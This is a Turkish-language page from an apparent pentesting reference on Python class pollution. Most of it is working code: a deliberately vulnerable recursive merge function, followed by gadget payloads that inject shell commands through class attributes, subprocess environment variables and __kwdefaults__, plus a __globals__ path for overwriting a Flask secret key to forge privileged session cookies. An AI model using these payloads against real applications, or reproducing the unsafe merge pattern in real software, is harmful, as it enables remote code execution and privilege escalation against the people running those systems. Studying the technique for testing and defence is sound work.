# Sınıf Kirliliği (Python'un Prototip Kirliliği)

{{#include ../../banners/hacktricks-training.md}}

## Temel Örnek

Dizelerle nesne sınıflarının nasıl kirletilebileceğini kontrol edin:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Temel Güvenlik Açığı Örneği
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget Örnekleri

<details>

<summary>Sınıf özelliği varsayılan değerini RCE (subprocess) oluşturma</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Diğer sınıfları ve global değişkenleri <code>globals</code> aracılığıyla kirletmek</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Keyfi alt süreç yürütme</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Üzerine Yazma <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** tüm fonksiyonların özel bir niteliğidir, Python [belgelendirmesine](https://docs.python.org/3/library/inspect.html) göre, bu “**anahtar kelime yalnızca** parametreler için herhangi bir varsayılan değerin eşlemesidir”. Bu niteliği kirletmek, bir fonksiyonun anahtar kelime yalnızca parametrelerinin varsayılan değerlerini kontrol etmemizi sağlar, bunlar \* veya \*args'den sonra gelen fonksiyonun parametreleridir.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Flask gizli anahtarını dosyalar arasında geçersiz kılma</summary>

Yani, eğer web'in ana python dosyasında tanımlı bir nesne üzerinde bir sınıf kirlenmesi yapabiliyorsanız ama **sınıfı ana dosyadan farklı bir dosyada tanımlıysa**. Çünkü önceki yüklerde \_\_globals\_\_'a erişmek için nesnenin sınıfına veya sınıfın yöntemlerine erişmeniz gerekiyor, o dosyadaki **globals'a erişebileceksiniz, ama ana dosyadakine erişemeyeceksiniz**. \
Bu nedenle, **ana sayfada tanımlı olan Flask uygulama global nesnesine erişemeyeceksiniz**:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu senaryoda, Flask gizli anahtarını değiştirmek ve bu anahtarı bilerek [**yetki yükseltmek**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) için ana dosyaya ulaşmak üzere dosyaları geçmek için bir alete ihtiyacınız var **global nesne `app.secret_key`**. 

Bu yazıdan [şu şekilde bir yük](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Bu yükü kullanarak **`app.secret_key`**'i (uygulamanızdaki adı farklı olabilir) değiştirin, böylece yeni ve daha fazla yetkiye sahip flask çerezlerini imzalayabilirsiniz.

</details>

Ayrıca daha fazla yalnızca okunabilir gadget için aşağıdaki sayfayı kontrol edin:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Referanslar

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
